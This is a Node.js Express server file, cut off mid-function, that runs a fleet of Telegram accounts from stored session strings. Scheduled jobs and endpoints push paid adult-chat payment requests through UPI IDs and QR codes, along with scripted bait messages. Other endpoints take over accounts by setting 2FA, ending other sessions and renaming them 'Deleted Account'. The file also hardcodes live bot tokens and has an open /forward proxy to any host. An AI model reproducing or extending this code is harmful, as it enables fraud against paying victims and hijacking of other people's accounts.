'use strict';
const dotenv = require('dotenv')
dotenv.config();
const express = require('express');
const axios = require('axios');
const schedule = require('node-schedule-tz');
const timeOptions = { timeZone: 'Asia/Kolkata', timeZoneName: 'short' };
const ChannelService = require('./dbservice');
const { getClient, hasClient, disconnectAll, createClient, deleteClient, setActiveClientSetup, getActiveClientSetup } = require('./telegramManager');
const bodyParser = require('body-parser');
const swaggerUi = require('swagger-ui-express');
const swaggerSpec = require('./swaggerConfig');
const { sleep } = require('./utils');
const { fetchWithTimeout } = require('./utils');
const { execSync } = require('child_process');
const { CloudinaryService } = require('./cloudinary')
const fs = require('fs')
const range = require('range-parser');

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
process.on('exit', async () => {
  await ChannelService.getInstance().closeConnection();
  await disconnectAll();
});

var cors = require('cors');
const app = express();
const port = process.env.PORT || 8000;
const userMap = new Map();

let ip;
let clients;
let upiIds;
const pings = {}

fetchWithTimeout('https://ipinfo.io/json')
  .then(result => {
    return result.data;
  })
  .then((output) => {
    ip = output;
    console.log(ip)
  })
  .then(
    ChannelService.getInstance().connect().then(async () => {
      setTimeout(async () => {
        checkerclass.getinstance()
        await setUserMap();
      }, 100);
    })
  ).catch(err => console.error(err))

let count = 0;
let botCount = 0
const ppplbot = (chatId, botToken) => {
  let token = botToken;
  if (!token) {
    if (botCount % 2 == 1) {
      token = `bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY`
    } else {
      token = `bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA`
    }
    botCount++;
  }
  return `https://api.telegram.org/${token}/sendMessage?chat_id=${chatId ? chatId : "-1001801844217"}`
}
const pingerbot = `https://api.telegram.org/bot5807856562:${process.env.apikey}/sendMessage?chat_id=-1001703065531`;

const apiResp = {
  INSTANCE_NOT_EXIST: "INSTANCE_NOT_EXIST",
  CLIENT_NOT_EXIST: "CLIENT_NOT_EXIST",
  CONNECTION_NOT_EXIST: "CONNECTION_NOT_EXIST",
  ALL_GOOD: "ALL_GOOD",
  DANGER: "DANGER",
  WAIT: "WAIT"
};

async function setUserMap() {
  userMap.clear();
  const db = ChannelService.getInstance();
  await fetchWithTimeout(`${ppplbot()}&text=UptimeRobot : Refreshed Map`);
  const users = await db.getAllUserClients();
  clients = users
  upiIds = await db.getAllUpis()
  users.forEach(user => {
    userMap.set(user.userName.toLowerCase(), { url: `${user.repl}/`, timeStamp: Date.now(), deployKey: user.deployKey, downTime: 0, lastPingTime: Date.now(), clientId: user.clientId })
    pings[user.userName.toLowerCase()] = Date.now();
  })
}

function getClientData(cid) {
  const clients = Array.from(userMap.values())
  return clients.find((value) => {
    return value.clientId == cid
  })
}

function getCurrentHourIST() {
  const now = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const istTime = new Date(now.getTime() + istOffset);
  const istHour = istTime.getUTCHours();
  return istHour;
}
const connetionQueue = [];
try {
  schedule.scheduleJob('test', ' 0 * * * * ', 'Asia/Kolkata', async () => {
    console.log("Promoting.....");
    const hour = getCurrentHourIST();
    for (const value of userMap.values()) {
      await fetchWithTimeout(`${value.url}assureppl`);
      await sleep(3000);
      await fetchWithTimeout(`${value.url}promote`);
      if (hour && hour % 3 === 0) {
        await fetchWithTimeout(`${value.url}calltopaid`);
      }
      await sleep(3000);
      const db = ChannelService.getInstance();
      await db.clearStats();
    }
    await fetchWithTimeout(`https://uptimechecker.onrender.com/processusers/400/0`);
  })

  // schedule.scheduleJob('test1', ' 2 3,6,10,16,20,22 * * * ', 'Asia/Kolkata', async () => {
  //   Array.from(userMap.values()).map(async (value) => {
  //   })
  // })

  schedule.scheduleJob('test2', '*/10 * * * *', 'Asia/Kolkata', async () => {
    Array.from(userMap.values()).map(async (value) => {
      await fetchWithTimeout(`${value.url}markasread`);
    })
  })

  schedule.scheduleJob('test3', ' 15 7,13,16,21,23 * * * ', 'Asia/Kolkata', async () => {
    Array.from(userMap.values()).map(async (value) => {
      await fetchWithTimeout(`${value.url}asktopay`);
    });
  })

  schedule.scheduleJob('test3', ' 25 0 * * * ', 'Asia/Kolkata', async () => {
    for (const value of userMap.values()) {
      await sleep(1000);
      await fetchWithTimeout(`${value.url}resetunpaid`);
      // await fetchWithTimeout(`${value.url}resetunppl`);
      await fetchWithTimeout(`${value.url}getuserstats2`);
      // const now = new Date();
      // if (now.getUTCDate() % 3 === 1) {
      //   setTimeout(async () => {
      //     await fetchWithTimeout(`${value.url}getchannels`);
      //   }, 30000);
      // }
      setTimeout(async () => {
        await fetchWithTimeout(`${value.url}asktopay`);
      }, 300000);
      await sleep(1000)
    }

    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(await getPromotionStatsPlain())}`);
    const db = ChannelService.getInstance();
    await db.resetPaidUsers();
    await db.updateActiveChannels();
    await db.clearStats2();
    await db.reinitPromoteStats();
    try {
      const resp = await axios.get(`https://mychatgpt-pg6w.onrender.com/getstats`, { timeout: 55000 });
      const resp2 = await axios.get(`https://mychatgpt-pg6w.onrender.com/clearstats`, { timeout: 55000 });
    } catch (error) {
      console.log("Some Error: ", error.code)
    }
  })
} catch (error) {
  console.log("Some Error: ", error.code);
}

async function assure() {
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.url}resptopaid?msg=Hey...Dont worry!! I will Call you pakka ok!!`);
    setTimeout(async () => {
      await fetchWithTimeout(`${value.url}markasread?all=true`);
    }, 20000)
  })
}

app.use(cors());
app.use(bodyParser.json());
app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));
app.get('/', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {

  //
});

app.get('/exitacc', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  //
});

app.get('/processUsers/:limit/:skip', async (req, res, next) => {
  res.send("ok")
  next();
}, async (req, res) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const db = await ChannelService.getInstance();
  const cursor = await db.processUsers(parseInt(limit), parseInt(skip));
  while (await cursor.hasNext()) {
    const document = await cursor.next();
    console.log("In processUsers")
    const cli = await createClient(document.mobile, document.session);
    const client = await getClient(document.mobile);
    if (cli) {
      console.log(document.mobile, " :  true");
      const lastActive = await client.getLastActiveTime();
      const date = new Date(lastActive * 1000).toISOString().split('T')[0];
      const me = await client.getMe()
      await db.updateUser(document, { msgs: cli.msgs, totalChats: cli.total, lastActive, date, tgId: me.id.toString(), lastUpdated: new Date().toISOString().split('T')[0] });
      await client?.disconnect(document.mobile);
      await deleteClient()
    } else {
      console.log(document.mobile, " :  false");
      await db.deleteUser(document);
    }
  }
  console.log("finished")
});

app.get('/refreshMap', async (req, res) => {
  checkerclass.getinstance();
  await setUserMap();
  res.send('Hello World!');
});

app.get('/clearstats2', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  await db.clearStats2();
  res.send('Hello World!');
});

app.get('/exit', async (req, res) => {
  await ChannelService.getInstance().closeConnection();
  process.exit(1)
  res.send('Hello World!');
});

app.post('/channels', async (req, res, next) => {
  res.send('Hello World!');
  // console.log(req.body);
  next();
}, async (req, res) => {
  const channels = req.body?.channels;
  const db = ChannelService.getInstance();
  channels?.forEach(async (channel) => {
    await db.insertChannel(channel);
  })
});

app.get('/getip', (req, res) => {
  res.json(ip);
});

app.post('/users', async (req, res, next) => {
  res.send('Hello World!');
  console.log(req.body);
  next();
}, async (req, res) => {
  const user = req.body;
  const db = ChannelService.getInstance();
  await db.insertUser(user);
  await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
});

app.get('/channels/:limit/:skip', async (req, res, next) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const k = req.query?.k
  const db = ChannelService.getInstance();
  const channels = await db.getChannels(parseInt(limit), parseInt(skip), k);
  let resp = 'joinchannel:'
  for (const channel of channels) {
    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
  }
  res.send(resp);
});

app.get('/activechannels/:limit/:skip', async (req, res, next) => {
  const limit = req.params.limit ? req.params.limit : 30
  const skip = req.params.skip ? req.params.skip : 20
  const k = req.query?.k
  const db = ChannelService.getInstance();
  const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), [k], [], 'channels');
  let resp = 'joinchannel:'
  for (const channel of result) {

    resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
  }
  res.send(resp);
});

let refresTime = Date.now();
app.get('/getdata', async (req, res, next) => {
  checkerclass.getinstance()
  if (Date.now() > refresTime) {
    refresTime = Date.now() + (5 * 60 * 1000);
    Array.from(userMap.values()).map(async (value) => {
      await fetchWithTimeout(`${value.url}markasread`);
    })
  }
  res.setHeader('Content-Type', 'text/html');
  let resp = '<html><head></head><body>';
  resp = resp + await getData();
  resp += '</body></html>';
  resp += `<script>
              console.log("hii");
              setInterval(() => {
                window.location.reload();
              }, 20000);
          </script>`;
  res.send(resp);
});

app.get('/getdata2', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}getDemostat2`);
    await sleep(1000);
  }
});

app.get('/getAllIps', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    try {
      console.log(value.clientId)
      const res = await fetchWithTimeout(`${value.url}getip`);
      console.log(res.data);
    } catch (error) {

    }
  }
});

app.get('/refreshupis', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}refreshupis`);
  }
});


app.get('/getviddata', async (req, res, next) => {
  checkerclass.getinstance()
  const chatId = req.query.chatId;
  let profile = req.query.profile;
  if (!profile && req.query.clientId) {
    profile = req.query.clientId?.replace(/\d/g, '')
  }
  const db = ChannelService.getInstance();
  const data = await db.getuserdata({ chatId, profile });
  res.json(data);
});

app.post('/getviddata', async (req, res, next) => {
  checkerclass.getinstance()
  let profile = req.query.profile;
  if (!profile && req.query.clientId) {
    profile = req.query.clientId?.replace(/\d/g, '')
  }
  const body = req.body;
  const chatId = body.chatId;
  const db = ChannelService.getInstance();
  const data = await db.updateUserData({ chatId, profile }, body);
  res.json(data);
});

app.get('/blockUser/:profile/:chatId', async (req, res, next) => {
  checkerclass.getinstance()
  let profile = req.params.profile;
  const chatId = req.params.chatId;
  const db = ChannelService.getInstance();
  const data = await db.updateUserData({ chatId, profile }, { canReply: 0, payAmount: 0 });
  res.json(data);
});

app.get('/sendvclink', async (req, res, next) => {
  checkerclass.getinstance()
  const chatId = req.query.chatId;
  const video = req.query.video;
  const profile = req.query.clientId;
  const client = getClientData(profile);
  const url = `${client?.url}sendvclink/${chatId}?${video ? `video=${video}` : ""}`;
  console.log(url);
  await fetchWithTimeout(url);
  res.send("done");
});

app.get('/sendvclink/:clientId/:chatId', async (req, res, next) => {
  checkerclass.getinstance()
  const clientId = req.params.clientId;
  const chatId = req.params.chatId;
  const video = req.query.video;
  const client = getClientData(clientId);
  const url = `${client?.url}sendvclink/${chatId}?${video ? `video=${video}` : ""}`;
  console.log(url);
  await fetchWithTimeout(url);
  res.send("done");
});

app.get('/blockUserall/:chatId', async (req, res, next) => {
  checkerclass.getinstance()
  const chatId = req.params.chatId;
  const db = ChannelService.getInstance();
  const data = await db.updateUserData({ chatId }, { canReply: 0, payAmount: 0 });
  res.json(data);
});

app.get('/getuserdata', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}getuserstats`);
    await sleep(1000);
  }
});

app.get('/getuserdata2', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}getuserstats2`);
    await sleep(1000);
  }
});

app.get('/restartall', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.deployKey}`);
  })
});
app.get('/sendtoall', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received sendtoall request');
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const queries = req.query
  let newQuery = '';
  Object.keys(req.query).map((key) => {
    newQuery += `/${queries[key]}`
  });
  console.log(newQuery);
  for (const value of userMap.values()) {
    const url = `${value.url.slice(0, -1)}${newQuery}`;
    console.log(url);
    await sleep(1000);
    await fetchWithTimeout(url);
  }
});

app.get('/usermap', async (req, res) => {
  checkerclass.getinstance()
  console.log('Received Usermap request');
  res.json(Array.from(userMap.values()));
});

app.get('/getbufferclients', async (req, res) => {
  const db = ChannelService.getInstance();
  const result = []
  const clients = await db.readBufferClients({});
  clients.forEach((cli) => {
    result.push(cli.mobile);
  })
  res.json(result);
});

app.get('/clients', async (req, res) => {
  checkerclass.getinstance();
  console.log('Received Client request');
  res.json(clients)
});

app.get('/keepready2', async (req, res, next) => {
  checkerclass.getinstance()
  console.log('Received keepready2 request');
  res.send(`Responding!!\nMsg = ${req.query.msg}`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg2 = ", msg);
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.url}resptopaid2?msg=${msg ? msg : "Oye..."}`);
    await fetchWithTimeout(`${value.url}getDemostats`);
  });
  const db = ChannelService.getInstance();
  await db.clearStats()
});

app.get('/keepready', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received Keepready request');
  const dnsMsg = encodeURIComponent(`Dont Speak Okay!!\n**I am in Bathroom**\n\nMute yourself!!\n\nI will show you Okay..!!`)
  const msg = req.query.msg.toLowerCase() == 'dns' ? dnsMsg : req.query.msg;
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.url}resptopaid?msg=${msg ? msg : "Oye..."}`);
  });
  const db = ChannelService.getInstance();
  await db.clearStats();
  res.send(`Responding!!\=url:resptopaid?msg=${msg ? msg : "Oye..."}`);
});

app.get('/asktopay', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received AsktoPay request');
  res.send(`Asking Pppl`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg = ", msg);
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.url}asktopay`)
  })
});

let callingTime = Date.now();
app.get('/calltopaid', async (req, res, next) => {
  checkerclass.getinstance()
  console.log('Received Call request');
  res.send(`Asking Pppl`);
  next();
}, async (req, res) => {
  const msg = req.query.msg;
  console.log("Msg = ", msg);
  if (Date.now() > callingTime) {
    callingTime = Date.now() + (10 * 60 * 1000)
    Array.from(userMap.values()).map(async (value) => {
      await fetchWithTimeout(`${value.url}calltopaid`)
    })
  }
});


app.get('/markasread', async (req, res, next) => {
  checkerclass.getinstance();
  console.log('Received MarkasRead Req');
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const all = req.query.all;
  if (Date.now() > refresTime) {
    refresTime = Date.now() + (5 * 60 * 1000);
    console.log("proceeding with all = ", all);
    Array.from(userMap.values()).map(async (value) => {
      await fetchWithTimeout(`${value.url}markasread?${all ? "all=true" : ''}`);
    })
  }
});

app.get('/setactiveqr', async (req, res, next) => {
  checkerclass.getinstance()
  res.send('Hello World!');
  next();
}, async (req, res) => {
  const upi = req.query.upi;
  console.log("upi = ", upi);
  Array.from(userMap.values()).map(async (value) => {
    await fetchWithTimeout(`${value.url}setactiveqr?upi=${upi}`);
  })
});

app.get('/joinchannel', async (req, res, next) => {
  res.send('Hello World!');
  next();
}, async (req, res) => {
  try {
    const userName = req.query.userName;
    if (userName) {
      const data = userMap.get(userName.toLowerCase());
      if (data) {
        joinchannels(data)
      } else {
        console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), `User ${userName} Not exist`);
      }
    } else {
      Array.from(userMap.values()).map(async (value) => {
        try {
          joinchannels(value);
          await sleep(3000);
        } catch (error) {
          console.log("Some Error: ", error.code);
        }
      })
    }
  } catch (error) {
    console.log("Some Error: ", error);
  }
});


app.get('/getUpiId', async (req, res) => {
  checkerclass.getinstance();
  const app = req.query.app ? req.query.app : "paytm3"
  const db = ChannelService.getInstance();
  const upiId = await db.getupi(app);
  res.send(upiId);
});

app.get('/getAllUpiIds', async (req, res) => {
  checkerclass.getinstance();
  res.json(upiIds);
});

app.post('/getAllUpiIds', async (req, res, next) => {
  const data = req.body
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const upiIds = await db.updateUpis(data);
  res.json(upiIds);
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}refreshupis`);
  }
})

app.get('/getUserConfig', async (req, res) => {
  const filter = req.query
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const userConfig = await db.getUserConfig(filter);
  res.json(userConfig);
});

app.get('/getUserInfo', async (req, res) => {
  const filter = req.query
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const userConfig = await db.getUserInfo(filter);
  res.json(userConfig);
});

app.post('/updateUserData/:chatId ', async (req, res) => {
  const data = req.body
  const chatId = req.params.chatId
  const profile = req.query.profile;
  checkerclass.getinstance();
  const filter = { chatId }
  if (profile) {
    filter['profile'] = profile
  }
  const db = ChannelService.getInstance();
  const userConfig = await db.updateUserData(filter, data);
  res.json(userConfig);
});

app.post('/getUserConfig', async (req, res) => {
  const filter = req.query
  const data = req.body
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const upiIds = await db.updateUserConfig(filter, data);
  await setUserMap();
  res.json(upiIds);
});


app.get('/builds', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const data = await db.getBuilds();
  console.log(data);
  res.json(data);
});

app.post('/builds', async (req, res) => {
  const data = req.body
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  console.log(data);
  const result = await db.updateBuilds(data);
  res.json(result);
});

app.get('/getAllUserClients', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const userConfig = await db.getAllUserClients();
  const resp = []
  userConfig.map((user) => {
    resp.push(user.clientId)
  })
  res.send(resp);
});

app.get('/getTgConfig', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const tgConfig = await db.getTgConfig()
  res.json(tgConfig);
});

app.get('/updateActiveChannels', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const tgConfig = await db.updateActiveChannels();
  res.send("ok");
});

app.get('/getCurrentActiveUniqueChannels', async (req, res) => {
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const result = await db.getCurrentActiveUniqueChannels();
  res.json({ length: result.length, data: result });
});

app.post('/getTgConfig', async (req, res, next) => {
  const data = req.body
  checkerclass.getinstance();
  const db = ChannelService.getInstance();
  const upiIds = await db.updateUpis(data)
  res.json(upiIds);
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    await fetchWithTimeout(`${value.url}refreshupis`);
  }
});

app.get('/lastpings', async (req, res, next) => {
  checkerclass.getinstance();
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    resp = resp + `${value.clientId}  :  ${Number(((Date.now() - value.lastPingTime) / 60000).toFixed(2))}\n`
  }
  resp += '</pre></body></html>';
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/lastpingsjson', async (req, res, next) => {
  checkerclass.getinstance();
  let resp = '<html><head><style>pre { font-size: 18px; }</style></head><body><pre>';
  for (const userdata in pings) {
    resp = resp + `${userdata}  :  ${Number(((Date.now() - pings[userdata]) / 60000).toFixed(2))}\n`
  }
  resp += '</pre></body></html>';
  res.setHeader('Content-Type', 'text/html');
  res.send(resp);
});

app.get('/exitglitches', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.url.toLowerCase().includes('glitch'))
      await fetchWithTimeout(`${value.url}exit`);
  }
});

app.get('/exitprimary', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.clientId.toLowerCase().includes('1')) {
      await fetchWithTimeout(`${value.url}exit`);
      await sleep(40000);
    }
  }
});

app.get('/exitsecondary', async (req, res, next) => {
  res.send("ok")
  next();
}, async () => {
  const userValues = Array.from(userMap.values());
  for (let i = 0; i < userValues.length; i++) {
    const value = userValues[i];
    if (value.clientId.toLowerCase().includes('2')) {
      await fetchWithTimeout(`${value.url}exit`);
      await sleep(40000)
    }
  }
});

app.get('/connectclient2/:number', async (req, res) => {
  const number = req.params?.number;
  const db = ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (user) {
    const buttonHtml = `<button id='btn' style="width: 50vw; height: 30vw; border-radius:20px;font-size:4vh"  onclick="triggerHtmlRequest('${user.mobile}', '${user.session}')">Create Client</button>
    <script>
      function triggerHtmlRequest(mobile, session) {
        console.log(${number})
        const button = document.getElementById('btn')
        const request = new XMLHttpRequest();
        request.open('GET', 'https://uptimechecker.onrender.com/cc/' + ${number}, true);
        request.onload = function() {
          if (request.status >= 200 && request.status < 400) {
            button.innerHTML = request.responseText;
          } else {
            console.error('Failed to fetch URL');
          }
        };
        request.send();
        }
    </script>`
    res.send(`<html><body style="justify-content: center; display: flex;align-items:center;font-size:5vh"><b style="display:block"><h6>User Exists</h6>${buttonHtml}</b></body></html>`);
  } else {
    res.send("<html><body style='justify-content: center; display: flex;align-items:center;font-size:5vh'>User Does not exist</body></html>");
  }
});

// Second API to create the client when the button is clicked
app.get('/cc/:number', async (req, res) => {
  const number = req.params?.number;
  if (!hasClient(number)) {
    console.log("In createclient - ", req.ip);
    const cli = await createClient(number, /* Add user session here */);
    if (cli) {
      res.send("client created");
    } else {
      res.send("client EXPIRED");
    }
  } else {
    res.send("Client Already existing");
  }
});


app.get('/connectclient/:number', async (req, res) => {
  const number = req.params?.number;
  const db = ChannelService.getInstance();
  const user = await db.getUser({ mobile: number });
  if (user) {
    if (!hasClient(user.mobile)) {
      console.log("In connectclient - ", req.ip)
      const cli = await createClient(user.mobile, user.session);
      if (cli) {
        res.send("client created");
      } else {
        res.send("client EXPIRED");
      }
    } else {
      res.send("Client Already existing");
    }
  } else {
    res.send("User Does not exist");
  }
});

app.get('/sendToChannel', async (req, res, next) => {
  res.send("sendToChannel");
  next();
}, async (req, res) => {
  try {
    const message = req.query?.msg;
    const chatId = req.query?.chatId;
    const token = req.query?.token;
    await fetchWithTimeout(`${ppplbot(chatId, token)}&text=${decodeURIComponent(message)}`, {}, 3)
  } catch (e) {
    console.log(e);
  }
})

app.get('/joinchannels/:number/:limit/:skip', async (req, res, next) => {
  res.send("joiningChannels");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const limit = req.params.limit ? req.params.limit : 30
    const skip = req.params.skip ? req.params.skip : 20
    const k = req.query?.k
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!hasClient(user.mobile)) {
      console.log("In joinchannels")
      const cli = await createClient(user.mobile, user.session, false);
      if (cli) {
        const client = await getClient(user.mobile);
        const channels = await client.channelInfo(true);
        const keys = ['wife', 'adult', 'lanj', 'lesb', 'paid', 'randi', 'bhab', 'boy', 'girl'];
        const result = await db.getActiveChannels(parseInt(limit), parseInt(skip), k ? [k] : keys, channels.ids, 'channels');
        console.log("DbChannelsLen: ", result.length);
        let resp = '';
        for (const channel of result) {

          resp = resp + (channel?.username?.startsWith("@") ? channel.username : `@${channel.username}`) + "|";
        }
        await client.removeOtherAuths();
        client.joinChannels(resp);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/getuser/:number/:u', async (req, res, next) => {
  try {
    const number = req.params?.number;
    const username = req.params?.u;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!hasClient(user.mobile)) {
      console.log("In getuser")
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      console.log("Connected");
      if (cli) {
        console.log("checking for :", username)
        const res = await client.getchatId(username)
        return (res)
      } else {
        console.log("Client Does not exist!")
      }
    } else {
      const client = await getClient(user.mobile);
      if (cli) {
        const res = await client.getchatId(username)
        return (res)
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error.code)
  }
});

app.get('/set2fa/:number', async (req, res, next) => {
  res.send("Setting 2FA");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!hasClient(user.mobile)) {
      console.log("In set2fa")
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.set2fa();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error.code)
  }
});

app.get('/setpp/:number/:name', async (req, res, next) => {
  res.send("Setting 2FA");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const name = req.params?.name;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    if (!hasClient(user.mobile)) {
      console.log("In setpp")
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await CloudinaryService.getInstance(name);
        await sleep(2000);
        await client.updateProfilePic('./dp1.jpg');
        await sleep(1000);
        await client.updateProfilePic('./dp2.jpg');
        await sleep(1000);
        await client.updateProfilePic('./dp3.jpg');
        await sleep(1000);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error.code)
  }
});


app.get('/SetAsBufferClient/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.set2fa();
        await sleep(30000)
        await client.updateUsername();
        await sleep(5000)
        await client.updatePrivacyforDeletedAccount();
        await sleep(5000)
        await client.updateProfile("Deleted Account", "Deleted Account");
        await sleep(5000)
        await client.deleteProfilePhotos();
        await sleep(5000)
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/updatePrivacy/:number', async (req, res, next) => {
  res.send("Updating Privacy");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.updatePrivacy();
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});

app.get('/forward*', async (req, res) => {
  let targetHost = 'https://tgcms.glitch.me';
  if (req.query.host) {
    targetHost = req.query.host;
  }
  try {
    console.log(req.url);
    const finalUrl = `${targetHost}${req.url.replace('/forward', '')}`
    console.log("final:", finalUrl)
    const response = await fetchWithTimeout(finalUrl)
    res.status(response?.status).send(response?.data);
  } catch (error) {
    console.log(error)
    res.status(500).send('Internal Server Error');
  }
});

app.get('/UpdateUsername/:number', async (req, res, next) => {
  res.send("Updating Privacy");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const username = req.query?.username;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.updateUsername(username);
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/UpdatePP/:number', async (req, res, next) => {
  res.send("Updating profile Pic");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.updateProfilePic("./qrcode.jpg");
      } else {
        console.log("Client Does not exist!")
      }
    }
  } catch (error) {
    console.log("Some Error: ", error)
  }
});


app.get('/UpdateName/:number', async (req, res, next) => {
  res.send("Updating Name");
  next();
}, async (req, res) => {
  try {
    const number = req.params?.number;
    const db = ChannelService.getInstance();
    const user = await db.getUser({ mobile: number });
    console.log(user);
    if (!hasClient(user.mobile)) {
      const cli = await createClient(user.mobile, user.session);
      const client = await getClient(user.mobile);
      if (cli) {
        await client.updateProfile("Deleted Account", "Deleted Account");
      } else {
